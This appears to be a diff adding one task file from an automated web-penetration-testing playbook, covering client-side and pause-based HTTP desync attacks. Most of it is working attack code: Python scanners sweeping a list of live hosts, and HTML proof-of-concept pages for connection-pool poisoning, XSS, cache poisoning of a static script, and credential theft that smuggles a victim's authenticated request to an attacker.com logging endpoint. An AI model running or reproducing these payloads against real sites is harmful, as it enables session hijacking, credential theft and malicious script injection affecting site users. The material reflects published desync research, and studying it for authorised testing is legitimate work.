@@ -1,0 +1,835 @@
+================================================================================
+TASK 83 - BROWSER-BASED DESYNC ATTACKS
+================================================================================
+Covers testing_toolkit.txt Phase 11 Step 38
+Client-side desynchronization and browser-powered request smuggling
+
+These attacks use the VICTIM'S BROWSER to perform smuggling:
+- No direct server access needed
+- Victim visits attacker page
+- Browser sends malformed requests
+- Achieves XSS, cache poisoning, credential theft
+
+================================================================================
+INPUTS
+================================================================================
+outputs/live_base_urls.txt                 <- Live hosts to test
+outputs/smuggling/*_vulnerable.txt         <- From Task 81 (smuggling-capable)
+outputs/http2/h2_supported.txt             <- From Task 82 (H2 hosts)
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/desync/
+    client_desync_vulnerable.txt           <- Client-side desync targets
+    pause_desync_vulnerable.txt            <- Pause-based desync targets
+    browser_smuggle_pocs.html              <- PoC HTML files
+    csd_exploitation_chains.txt            <- Exploitation paths
+
+outputs/vulnerabilities/DESYNC-*-HIGH.md   <- Individual vuln reports
+
+================================================================================
+[AGENT DECISION FRAMEWORK]
+================================================================================
+
+STOP AND THINK: Browser desync requires specific conditions.
+
+    What type of browser desync?
+    |
+    +-- Client-Side Desync (CSD)
+    |   |
+    |   +-- Uses browser's HTTP stack
+    |   +-- fetch() or XHR with specific headers
+    |   +-- Requires: Server that doesn't normalize requests
+    |   +-- Impact: XSS on any origin, credential theft
+    |
+    +-- Pause-Based Desync
+    |   |
+    |   +-- Exploits server timeouts
+    |   +-- Pause mid-request, server processes partial
+    |   +-- Requires: Vulnerable timeout handling
+    |   +-- Impact: Same as traditional smuggling
+    |
+    +-- Browser-Powered Smuggling
+        |
+        +-- Use browser to send smuggling payloads
+        +-- Bypasses browser security restrictions
+        +-- Requires: Task 81 confirmed smuggling
+        +-- Impact: Attack through victim's session
+
+    Prerequisites check:
+    |
+    +-- Did Task 81 find smuggling-capable hosts?
+    |   +-- YES -> Can chain with browser attacks
+    |   +-- NO -> Focus on CSD-specific detection
+    |
+    +-- Does target allow cross-origin requests?
+        +-- Check CORS headers
+        +-- Check if fetch() works from attacker origin
+
+================================================================================
+PHASE 1: UNDERSTAND BROWSER DESYNC
+================================================================================
+
+-----------------------------------------
+1.1 Client-Side Desync (CSD) Concept
+-----------------------------------------
+Traditional smuggling: Attacker sends malformed request directly
+Browser desync: VICTIM's browser sends malformed request
+
+HOW IT WORKS:
+1. Victim visits attacker's page
+2. JavaScript makes fetch() request to vulnerable site
+3. Request desynchronizes the connection
+4. Victim's next request to that site is hijacked
+
+WHY IT'S POWERFUL:
+- Attack happens in victim's browser
+- Uses victim's cookies/session
+- Bypasses SameSite cookie restrictions
+- Can achieve XSS on any vulnerable origin
+
+-----------------------------------------
+1.2 Pause-Based Desync Concept
+-----------------------------------------
+Some servers have timeout behaviors that can be exploited:
+
+1. Start sending request body
+2. PAUSE (stop sending)
+3. Server times out, processes partial request
+4. Resume sending -> treated as NEW request
+
+This bypasses front-end parsing entirely.
+
+================================================================================
+PHASE 2: CLIENT-SIDE DESYNC DETECTION
+================================================================================
+
+-----------------------------------------
+2.1 CSD Vulnerability Scanner
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+csd_detect.py - Detect Client-Side Desync vulnerabilities
+"""
+
+import requests
+import time
+
+def test_csd_potential(url):
+    """Test if server might be vulnerable to CSD"""
+    
+    results = {
+        'url': url,
+        'chunked_support': False,
+        'content_length_ignored': False,
+        'connection_reuse': False,
+        'potential_csd': False
+    }
+    
+    # Test 1: Does server support chunked encoding?
+    try:
+        resp = requests.post(
+            url,
+            headers={
+                'Transfer-Encoding': 'chunked',
+                'Content-Type': 'text/plain'
+            },
+            data='5\r\nhello\r\n0\r\n\r\n',
+            timeout=10
+        )
+        if resp.status_code < 500:
+            results['chunked_support'] = True
+    except:
+        pass
+    
+    # Test 2: CL.0 - Does server ignore Content-Length: 0?
+    try:
+        resp = requests.post(
+            url,
+            headers={
+                'Content-Length': '0',
+                'Content-Type': 'text/plain'
+            },
+            data='SMUGGLED',  # Body despite CL:0
+            timeout=10
+        )
+        # If server processed the body, it ignored CL:0
+        if 'SMUGGLED' in resp.text or resp.status_code == 200:
+            results['content_length_ignored'] = True
+    except:
+        pass
+    
+    # Test 3: Connection reuse (needed for desync)
+    session = requests.Session()
+    try:
+        resp1 = session.get(url, timeout=10)
+        resp2 = session.get(url, timeout=10)
+        
+        # Check if same connection was reused (via headers or behavior)
+        if resp1.headers.get('Connection', '').lower() != 'close':
+            results['connection_reuse'] = True
+    except:
+        pass
+    
+    # Potential CSD if chunked + connection reuse
+    if results['chunked_support'] and results['connection_reuse']:
+        results['potential_csd'] = True
+    
+    return results
+
+# Scan hosts
+import os
+os.makedirs('outputs/desync', exist_ok=True)
+
+csd_candidates = []
+
+with open('outputs/live_base_urls.txt') as f:
+    for line in f:
+        url = line.strip()
+        print(f"[*] Testing CSD: {url}")
+        
+        result = test_csd_potential(url)
+        
+        if result['potential_csd']:
+            print(f"[+] POTENTIAL CSD: {url}")
+            csd_candidates.append(url)
+
+with open('outputs/desync/client_desync_vulnerable.txt', 'w') as f:
+    for url in csd_candidates:
+        f.write(f"{url}\n")
+
+print(f"\n[*] Found {len(csd_candidates)} potential CSD targets")
+
+-----------------------------------------
+2.2 CSD via Fetch API Test
+-----------------------------------------
+Create HTML PoC to test from browser:
+
+```html
+<!-- csd_test.html - Test Client-Side Desync -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSD Test</title>
+</head>
+<body>
+    <h1>Client-Side Desync Test</h1>
+    <button onclick="testCSD()">Test CSD</button>
+    <pre id="output"></pre>
+
+    <script>
+    async function testCSD() {
+        const target = 'https://TARGET.com/';
+        const output = document.getElementById('output');
+        
+        output.textContent = 'Testing CSD...\n';
+        
+        try {
+            // CL.0 desync attempt
+            // Send request with Content-Length: 0 but include body
+            const response = await fetch(target, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'text/plain',
+                    'Content-Length': '0'  // Browser may ignore this
+                },
+                body: 'GET /admin HTTP/1.1\r\nHost: TARGET.com\r\n\r\n',
+                mode: 'cors',
+                credentials: 'include'
+            });
+            
+            output.textContent += `Response status: ${response.status}\n`;
+            output.textContent += await response.text();
+            
+        } catch (e) {
+            output.textContent += `Error: ${e.message}\n`;
+            output.textContent += 'CORS may be blocking - check Network tab\n';
+        }
+        
+        // Now make normal request - may get smuggled response
+        try {
+            const resp2 = await fetch(target);
+            output.textContent += '\n\nSecond request:\n';
+            output.textContent += await resp2.text();
+        } catch (e) {
+            output.textContent += `\nSecond request error: ${e.message}`;
+        }
+    }
+    </script>
+</body>
+</html>
+```
+
+-----------------------------------------
+2.3 Browser Connection Pool Poisoning
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+Generate PoC for browser connection pool poisoning
+"""
+
+def generate_csd_poc(target_url, smuggled_request):
+    """Generate HTML PoC for CSD attack"""
+    
+    poc = f'''<!DOCTYPE html>
+<html>
+<head>
+    <title>CSD PoC - Connection Pool Poison</title>
+</head>
+<body>
+    <h1>Client-Side Desync PoC</h1>
+    <p>Target: {target_url}</p>
+    
+    <script>
+    // Step 1: Poison the connection pool
+    async function poisonConnection() {{
+        // This request desynchronizes the connection
+        const smuggleBody = `{smuggled_request}`;
+        
+        try {{
+            await fetch('{target_url}', {{
+                method: 'POST',
+                body: smuggleBody,
+                mode: 'no-cors',  // Bypass CORS
+                credentials: 'include',
+                keepalive: true  // Keep connection in pool
+            }});
+        }} catch (e) {{
+            // Expected - connection is now poisoned
+        }}
+    }}
+    
+    // Step 2: Victim's next request uses poisoned connection
+    async function triggerVictimRequest() {{
+        // Wait for connection to be reused
+        await new Promise(r => setTimeout(r, 100));
+        
+        // This request may get the smuggled response
+        const resp = await fetch('{target_url}/api/me', {{
+            credentials: 'include'
+        }});
+        
+        console.log('Victim response:', await resp.text());
+    }}
+    
+    // Execute attack
+    poisonConnection().then(triggerVictimRequest);
+    </script>
+</body>
+</html>'''
+    
+    return poc
+
+# Generate PoC for confirmed smuggling targets
+with open('outputs/smuggling/smuggling_confirmed.txt') as f:
+    for line in f:
+        if line.startswith('#'):
+            continue
+        url = line.strip().split('|')[0] if '|' in line else line.strip()
+        if url:
+            poc = generate_csd_poc(
+                url,
+                'GET /admin HTTP/1.1\\r\\nHost: ' + url.replace('https://', '').replace('http://', '').split('/')[0] + '\\r\\n\\r\\n'
+            )
+            
+            safe_name = url.replace('https://', '').replace('http://', '').replace('/', '_').replace(':', '_')
+            with open(f'outputs/desync/poc_{safe_name}.html', 'w') as out:
+                out.write(poc)
+
+================================================================================
+PHASE 3: PAUSE-BASED DESYNC
+================================================================================
+
+-----------------------------------------
+3.1 Pause-Based Desync Theory
+-----------------------------------------
+Some servers handle partial requests incorrectly:
+
+NORMAL:
+Client sends: [HEADERS][BODY]
+Server waits for complete request
+
+PAUSE-BASED:
+Client sends: [HEADERS][PARTIAL BODY]
+Client PAUSES for X seconds
+Server timeout -> processes partial as complete
+Client resumes -> treated as NEW request
+
+This works when:
+- Server has request timeout
+- Server doesn't properly discard partial requests
+- Connection is reused after timeout
+
+-----------------------------------------
+3.2 Pause-Based Desync Detector
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+pause_desync_detect.py - Detect pause-based desync vulnerabilities
+"""
+
+import socket
+import ssl
+import time
+from urllib.parse import urlparse
+
+def test_pause_desync(url, pause_time=10):
+    """Test for pause-based desync vulnerability"""
+    
+    parsed = urlparse(url)
+    host = parsed.netloc.split(':')[0]
+    port = 443 if parsed.scheme == 'https' else 80
+    
+    print(f"[*] Testing pause-based desync: {url}")
+    
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(30)
+        
+        if port == 443:
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            sock = context.wrap_socket(sock, server_hostname=host)
+        
+        sock.connect((host, port))
+        
+        # Send headers + partial body
+        request_part1 = (
+            f"POST / HTTP/1.1\r\n"
+            f"Host: {parsed.netloc}\r\n"
+            f"Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Content-Length: 100\r\n"  # Promise 100 bytes
+            f"\r\n"
+            f"x=1"  # Send only 3 bytes
+        )
+        
+        sock.send(request_part1.encode())
+        print(f"[*] Sent partial request, pausing for {pause_time}s...")
+        
+        # PAUSE - let server timeout
+        time.sleep(pause_time)
+        
+        # Send "rest" which should be treated as new request
+        smuggled_request = (
+            f"GET /admin HTTP/1.1\r\n"
+            f"Host: {parsed.netloc}\r\n"
+            f"\r\n"
+        )
+        
+        sock.send(smuggled_request.encode())
+        
+        # Check response
+        try:
+            response = sock.recv(4096).decode('utf-8', errors='ignore')
+            
+            # If we get response for /admin, it worked
+            if '/admin' in response or 'admin' in response.lower():
+                print(f"[CRITICAL] Pause-based desync CONFIRMED!")
+                return True
+            elif '200' in response[:20]:
+                print(f"[+] Got response after pause - investigate manually")
+                return 'possible'
+                
+        except socket.timeout:
+            print(f"[-] No response after pause")
+        
+        sock.close()
+        
+    except Exception as e:
+        print(f"[-] Error: {e}")
+    
+    return False
+
+# Test all hosts
+results = []
+
+with open('outputs/live_base_urls.txt') as f:
+    for line in f:
+        url = line.strip()
+        result = test_pause_desync(url, pause_time=5)
+        
+        if result:
+            results.append(f"{url}|{result}")
+
+with open('outputs/desync/pause_desync_vulnerable.txt', 'w') as f:
+    for result in results:
+        f.write(f"{result}\n")
+
+-----------------------------------------
+3.3 Different Pause Timings
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+pause_timing_scan.py - Test different pause durations
+"""
+
+import socket
+import ssl
+import time
+from urllib.parse import urlparse
+
+def test_pause_timing(url, pause_seconds):
+    """Test specific pause duration"""
+    
+    parsed = urlparse(url)
+    host = parsed.netloc.split(':')[0]
+    port = 443 if parsed.scheme == 'https' else 80
+    
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(pause_seconds + 10)
+        
+        if port == 443:
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            sock = context.wrap_socket(sock, server_hostname=host)
+        
+        sock.connect((host, port))
+        
+        # Partial request
+        request = (
+            f"POST / HTTP/1.1\r\n"
+            f"Host: {parsed.netloc}\r\n"
+            f"Content-Length: 50\r\n"
+            f"\r\n"
+            f"x"  # 1 byte of 50
+        )
+        
+        sock.send(request.encode())
+        time.sleep(pause_seconds)
+        
+        # Check if connection still alive
+        try:
+            sock.send(b"y")  # Try to send more
+            response = sock.recv(1024)
+            sock.close()
+            return True  # Connection survived
+        except:
+            sock.close()
+            return False  # Connection died
+            
+    except:
+        return False
+
+# Test different timeouts
+PAUSE_TIMES = [1, 2, 5, 10, 15, 30, 60]
+
+print("[*] Testing pause timing thresholds...")
+
+with open('outputs/live_base_urls.txt') as f:
+    for line in f:
+        url = line.strip()
+        print(f"\n[*] Testing: {url}")
+        
+        for pause in PAUSE_TIMES:
+            alive = test_pause_timing(url, pause)
+            status = "alive" if alive else "dead"
+            print(f"  {pause}s pause -> connection {status}")
+            
+            if not alive:
+                print(f"  [!] Server timeout between {PAUSE_TIMES[PAUSE_TIMES.index(pause)-1]}s and {pause}s")
+                break
+
+================================================================================
+PHASE 4: BROWSER-POWERED EXPLOITATION
+================================================================================
+
+-----------------------------------------
+4.1 XSS via CSD
+-----------------------------------------
+If CSD works, can achieve XSS on target:
+
+```html
+<!-- csd_xss.html -->
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+// Attack: Get XSS on vulnerable.com via CSD
+
+const target = 'https://vulnerable.com';
+
+// Step 1: Poison connection with XSS payload
+fetch(target + '/search', {
+    method: 'POST',
+    body: 'x=1\r\n\r\nGET /search?q=<script>alert(document.domain)</script> HTTP/1.1\r\nHost: vulnerable.com\r\n\r\n',
+    mode: 'no-cors',
+    credentials: 'include'
+});
+
+// Step 2: Navigate victim to trigger
+setTimeout(() => {
+    // Open in iframe or redirect
+    window.location = target + '/search';
+}, 100);
+</script>
+</body>
+</html>
+```
+
+-----------------------------------------
+4.2 Credential Theft via CSD
+-----------------------------------------
+```html
+<!-- csd_credential_theft.html -->
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+// Steal credentials by capturing victim's authenticated request
+
+const target = 'https://vulnerable.com';
+const attacker = 'https://attacker.com/log';
+
+// Smuggle request that captures next request to attacker
+const smuggle = `POST ${attacker} HTTP/1.1\r\n` +
+    `Host: attacker.com\r\n` +
+    `Content-Type: text/plain\r\n` +
+    `Content-Length: 10000\r\n` +
+    `\r\n`;
+
+// Poison connection
+fetch(target, {
+    method: 'POST',
+    body: 'x=1\r\n\r\n' + smuggle,
+    mode: 'no-cors',
+    credentials: 'include'
+});
+
+// Victim's next request becomes body of POST to attacker
+setTimeout(() => {
+    fetch(target + '/api/profile', {
+        credentials: 'include'
+    });
+}, 100);
+</script>
+</body>
+</html>
+```
+
+-----------------------------------------
+4.3 Cache Poisoning via CSD
+-----------------------------------------
+```html
+<!-- csd_cache_poison.html -->
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+const target = 'https://vulnerable.com';
+
+// Smuggle request for static resource with malicious response
+const smuggle = `GET /static/main.js HTTP/1.1\r\n` +
+    `Host: vulnerable.com\r\n` +
+    `\r\n` +
+    `HTTP/1.1 200 OK\r\n` +
+    `Content-Type: application/javascript\r\n` +
+    `Content-Length: 50\r\n` +
+    `\r\n` +
+    `alert('cached XSS from '+document.domain);//`;
+
+fetch(target, {
+    method: 'POST',
+    body: 'x=1\r\n\r\n' + smuggle,
+    mode: 'no-cors'
+});
+</script>
+</body>
+</html>
+```
+
+================================================================================
+PHASE 5: FULL AUTOMATION
+================================================================================
+
+#!/usr/bin/env python3
+"""
+browser_desync_full.py - Complete browser desync scanner
+"""
+
+import os
+import json
+
+class BrowserDesyncScanner:
+    def __init__(self):
+        self.results = {
+            'csd_candidates': [],
+            'pause_desync': [],
+            'exploitation_chains': []
+        }
+        os.makedirs('outputs/desync', exist_ok=True)
+    
+    def test_csd(self, url):
+        """Test for client-side desync"""
+        import requests
+        
+        try:
+            # Test CL.0 behavior
+            resp = requests.post(
+                url,
+                headers={'Content-Length': '0'},
+                data='TESTBODY',
+                timeout=10,
+                verify=False
+            )
+            
+            # If body was processed despite CL:0, potential CSD
+            if resp.status_code == 200:
+                return True
+        except:
+            pass
+        return False
+    
+    def test_pause(self, url, pause=5):
+        """Test pause-based desync"""
+        import socket
+        import ssl
+        import time
+        from urllib.parse import urlparse
+        
+        parsed = urlparse(url)
+        host = parsed.netloc.split(':')[0]
+        port = 443 if parsed.scheme == 'https' else 80
+        
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(pause + 5)
+            
+            if port == 443:
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                sock = ctx.wrap_socket(sock, server_hostname=host)
+            
+            sock.connect((host, port))
+            
+            # Partial request
+            sock.send(f"POST / HTTP/1.1\r\nHost: {parsed.netloc}\r\nContent-Length: 50\r\n\r\nx".encode())
+            time.sleep(pause)
+            
+            # Try to continue
+            try:
+                sock.send(b"y")
+                resp = sock.recv(1024)
+                sock.close()
+                return True
+            except:
+                sock.close()
+                return False
+        except:
+            return False
+    
+    def generate_poc(self, url, attack_type):
+        """Generate HTML PoC for attack"""
+        
+        if attack_type == 'xss':
+            return f'''<!DOCTYPE html>
+<html><body>
+<script>
+fetch('{url}', {{
+    method: 'POST',
+    body: 'x=1\\r\\n\\r\\nGET /?xss=<script>alert(1)</script> HTTP/1.1\\r\\nHost: {url.split("//")[1].split("/")[0]}\\r\\n\\r\\n',
+    mode: 'no-cors'
+}});
+</script>
+</body></html>'''
+        
+        return ''
+    
+    def scan(self, urls_file):
+        """Scan all URLs"""
+        
+        with open(urls_file) as f:
+            urls = [l.strip() for l in f if l.strip()]
+        
+        print(f"[*] Testing {len(urls)} URLs for browser desync...")
+        
+        for url in urls:
+            print(f"[*] Testing: {url}")
+            
+            if self.test_csd(url):
+                print(f"[+] CSD candidate: {url}")
+                self.results['csd_candidates'].append(url)
+            
+            if self.test_pause(url):
+                print(f"[+] Pause desync possible: {url}")
+                self.results['pause_desync'].append(url)
+        
+        return self.results
+    
+    def save(self):
+        """Save results"""
+        
+        with open('outputs/desync/client_desync_vulnerable.txt', 'w') as f:
+            for url in self.results['csd_candidates']:
+                f.write(f"{url}\n")
+        
+        with open('outputs/desync/pause_desync_vulnerable.txt', 'w') as f:
+            for url in self.results['pause_desync']:
+                f.write(f"{url}\n")
+        
+        with open('outputs/desync/scan_results.json', 'w') as f:
+            json.dump(self.results, f, indent=2)
+        
+        # Generate PoCs
+        for url in self.results['csd_candidates']:
+            poc = self.generate_poc(url, 'xss')
+            safe_name = url.replace('://', '_').replace('/', '_')[:50]
+            with open(f'outputs/desync/poc_{safe_name}.html', 'w') as f:
+                f.write(poc)
+
+# Main
+if __name__ == "__main__":
+    import urllib3
+    urllib3.disable_warnings()
+    
+    scanner = BrowserDesyncScanner()
+    scanner.scan('outputs/live_base_urls.txt')
+    scanner.save()
+    
+    print(f"\n[*] CSD candidates: {len(scanner.results['csd_candidates'])}")
+    print(f"[*] Pause desync: {len(scanner.results['pause_desync'])}")
+
+================================================================================
+SUMMARY CHECKLIST
+================================================================================
+
+Before marking Task 83 complete, verify:
+
+[ ] CSD potential tested on all hosts
+[ ] Pause-based desync tested with different timings
+[ ] HTML PoCs generated for confirmed targets
+[ ] Exploitation chains documented
+[ ] Results saved to outputs/desync/
+
+================================================================================
+TOOLS REFERENCE
+================================================================================
+
+PRIMARY TECHNIQUES:
+- Client-Side Desync (CSD) - Browser connection poisoning
+- Pause-Based Desync - Server timeout exploitation
+- Browser-Powered Smuggling - Using victim's browser
+
+EXPLOITATION CHAINS:
+1. CSD -> XSS (reflect payload on target domain)
+2. CSD -> Credential theft (capture victim's requests)
+3. CSD -> Cache poisoning (poison static resources)
+4. Pause -> Request smuggling (bypass front-end)
+
+SEVERITY: HIGH
+- Attacks happen in victim's browser context
+- Bypasses SameSite cookies
+- Can achieve XSS without traditional injection
+
+RESEARCH REFERENCES:
+- James Kettle (PortSwigger) - Browser-Powered Desync Attacks
+- HTTP Desync Attacks: Request Smuggling Reborn
+
+================================================================================
+NEXT TASK
+================================================================================
+Task 84: Cache Poisoning (Web-Cache-Vulnerability-Scanner, nuclei cache)
